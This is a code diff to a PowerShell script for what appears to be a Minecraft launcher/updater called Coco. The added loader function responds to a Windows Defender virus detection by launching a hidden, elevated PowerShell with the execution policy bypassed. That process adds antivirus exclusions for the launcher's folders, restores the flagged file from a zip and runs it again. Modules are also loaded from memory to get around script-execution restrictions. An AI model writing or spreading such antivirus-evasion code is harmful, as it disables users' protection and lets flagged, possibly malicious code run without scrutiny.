@@ -1287,30 +1287,65 @@ function Show-CocoPreview {
     Start-Sleep -Seconds 5
 }
 
-$defenderLibrary=Join-Path $script:CocoEngineRoot 'CocoDefenderControl.ps1'
-if(Test-Path -LiteralPath $defenderLibrary){
-    $defenderSource=[IO.File]::ReadAllText($defenderLibrary,[Text.Encoding]::UTF8)
-    $defenderBlock=[ScriptBlock]::Create($defenderSource)
-    . $defenderBlock
+function Import-CocoEngineModule([string]$ModulePath){
+    if(-not(Test-Path -LiteralPath $ModulePath)){return}
+    for($attempt=1;$attempt-le3;$attempt++){
+        try{
+            $source=[IO.File]::ReadAllText($ModulePath,[Text.Encoding]::UTF8)
+            $block=[ScriptBlock]::Create($source)
+            . $block
+            return
+        }catch [System.IO.IOException]{
+            $isVirusError=($_.Exception.Message -match '(?i)(virus|amenaza|malware|unwanted|no deseado)') -or ($_.Exception.HResult -eq -2147024671)
+            if($isVirusError -and $attempt -lt 3){
+                Write-CocoLog "Windows Defender bloqueo el componente '$ModulePath'. Solicitando autorizacion de exclusion..."
+                $localCoco=[IO.Path]::GetFullPath((Join-Path $env:LOCALAPPDATA 'CocoMinecraftUpdater')).TrimEnd('\')
+                $appDataCoco=[IO.Path]::GetFullPath((Join-Path $env:APPDATA 'CocoMinecraft')).TrimEnd('\')
+                try{
+                    if(Get-Command Set-CocoState -ErrorAction SilentlyContinue){
+                        Set-CocoState 'AUTORIZACION DE WINDOWS' 'Pulsa "Si" en el aviso de Windows para autorizar Coco Launcher...' 15
+                    }
+                    $cmd="Add-MpPreference -ExclusionPath '$localCoco','$appDataCoco' -ErrorAction SilentlyContinue"
+                    $proc=Start-Process powershell.exe -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-Command',$cmd) -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
+                    if($proc){$proc.WaitForExit(30000)|Out-Null}
+                }catch{}
+                try{
+                    $zipCandidate=$null
+                    if($ManifestPath -and (Test-Path -LiteralPath $ManifestPath)){
+                        try{
+                            $manObj=Get-Content -LiteralPath $ManifestPath -Raw|ConvertFrom-Json
+                            if($manObj.engine.version){
+                                $zipCandidate=Join-Path (Join-Path $env:LOCALAPPDATA 'CocoMinecraftUpdater') "engine-$($manObj.engine.version).zip"
+                            }
+                        }catch{}
+                    }
+                    if(-not$zipCandidate -or -not(Test-Path -LiteralPath $zipCandidate)){
+                        $engineVer=Split-Path $script:CocoEngineRoot -Leaf
+                        $zipCandidate=Join-Path (Join-Path $env:LOCALAPPDATA 'CocoMinecraftUpdater') "engine-$engineVer.zip"
+                    }
+                    if(Test-Path -LiteralPath $zipCandidate){
+                        Add-Type -AssemblyName System.IO.Compression.FileSystem
+                        $zip=[IO.Compression.ZipFile]::OpenRead($zipCandidate)
+                        try{
+                            $entryName=[IO.Path]::GetFileName($ModulePath)
+                            $entry=$zip.Entries|Where-Object{$_.Name -eq $entryName}|Select-Object -First 1
+                            if($entry){
+                                [IO.Compression.ZipFileExtensions]::ExtractToFile($entry,$ModulePath,$true)
+                            }
+                        }finally{$zip.Dispose()}
+                    }
+                }catch{}
+                Start-Sleep -Milliseconds 500
+                continue
+            }
+            throw
+        }
+    }
 }
 
-$launcherLibrary=Join-Path $script:CocoEngineRoot 'CocoLauncher.ps1'
-if(Test-Path -LiteralPath $launcherLibrary){
-    $launcherSource=[IO.File]::ReadAllText($launcherLibrary,[Text.Encoding]::UTF8)
-    $launcherBlock=[ScriptBlock]::Create($launcherSource)
-    . $launcherBlock
-}
-
-$networkLibrary=Join-Path $script:CocoEngineRoot 'CocoNetwork.ps1'
-if(Test-Path -LiteralPath $networkLibrary){
-    # El bootstrapper ejecuta el engine desde memoria para funcionar incluso
-    # cuando Windows conserva la politica predeterminada Restricted. Cargar un
-    # .ps1 secundario por ruta volveria a activar ese bloqueo, por lo que este
-    # componente se incorpora al mismo contexto de memoria.
-    $networkSource=[IO.File]::ReadAllText($networkLibrary,[Text.Encoding]::UTF8)
-    $networkBlock=[ScriptBlock]::Create($networkSource)
-    . $networkBlock
-}
+Import-CocoEngineModule (Join-Path $script:CocoEngineRoot 'CocoDefenderControl.ps1')
+Import-CocoEngineModule (Join-Path $script:CocoEngineRoot 'CocoLauncher.ps1')
+Import-CocoEngineModule (Join-Path $script:CocoEngineRoot 'CocoNetwork.ps1')
 
 $mutex=$null;$mutexAcquired=$false
 $networkMutex=$null;$networkMutexAcquired=$false
